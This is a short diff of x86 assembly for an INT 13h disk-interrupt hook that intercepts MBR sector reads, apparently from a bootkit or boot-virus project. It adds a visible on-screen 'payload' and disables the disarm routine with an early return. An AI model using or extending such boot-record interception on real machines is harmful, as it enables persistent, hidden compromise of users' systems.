@@ -33,6 +33,20 @@ _int13h	PROC FAR
 	cmp	AH, 02h	; READ SECTORS
 	jz	@mbr
 @chain:
+	; Usless payload
+        mov	AX, 0B810h
+	mov	ES, AX
+        xor	AX, AX
+        mov	AL, byte ptr _callCount
+        shl	AX, 2
+        mov 	DI, AX
+        xor	AX, AX
+        mov	AL, byte ptr _callCount
+	mov	CX, 3100h
+        or	AX, CX
+        stosw
+
+        ; Chain interrupt handler
 	popa
 	push	word ptr CS:[_biosInt13h + 2]
 	push	word ptr CS:[_biosInt13h]
@@ -82,6 +96,7 @@ _int13h	PROC FAR
 	xor	AH, AH
 	iret
 @disarm:
+	retn
 	push	AX
         push	DI
         push	SI
